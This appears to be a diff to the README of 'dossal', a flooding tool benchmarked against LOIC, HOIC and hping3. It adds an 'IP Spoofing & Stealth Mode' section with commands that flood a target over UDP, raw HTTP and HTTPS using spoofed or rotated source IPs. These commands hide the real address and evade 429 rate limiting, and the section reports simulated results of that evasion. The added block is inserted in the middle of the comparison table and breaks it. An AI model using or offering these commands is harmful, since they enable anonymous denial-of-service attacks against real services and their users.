@@ -87,6 +87,32 @@ Options:
 | Tool | raw/HTTP RPS | HTTPS RPS | H2 RPS | gRPC RPS | UDP/QUIC PPS | Modes |
 |---|---:|---:|---:|---:|---:|---:|
 | **dossal v3.16** | **143k** | **103k** | **45k** | **12k** | **378k** | **17** |
+
+## IP Spoofing & Stealth Mode
+
+```bash
+# 100 spoofed IPs, hide real IP, auto-recover from 429
+dossal --mode udp --url udp://target:443 --spoof 100 --stealth --recovery
+
+# Load IPs from file
+dossal --mode raw --url http://target:80 --pool proxy-ips.txt --recovery
+
+# Auto-detect local IPs
+dossal --mode httpsmp --url https://target:443 --src-ips auto --recovery
+```
+
+| Flag | Description |
+|---|---|
+| `--spoof N` | Generate N spoofed source IPs (RFC 5737 TEST-NET, unclaimed) |
+| `--stealth` | Only use spoofed IPs, never expose real IP |
+| `--recovery` | Auto-detect 429, remove blocked IPs, continue with remaining |
+| `--pool FILE` | Load source IPs from file (one per line) |
+| `--src-ips auto` | Detect and rotate all local IPs |
+
+**cf-sim verification:**
+- Baseline (single IP): 0.8% passed, 99.2% 429'd
+- 100 spoofed IPs: 32 per-IP buckets detected (+167% more IP diversity)
+- UDP 339k PPS from 8 processes with IP rotation
 | LOIC | ~45k | N/A | N/A | N/A | N/A | 2 |
 | HOIC | ~50k | ~30k | N/A | N/A | N/A | 3 |
 | hping3 | ~15k | N/A | N/A | N/A | ~15k | 4 |
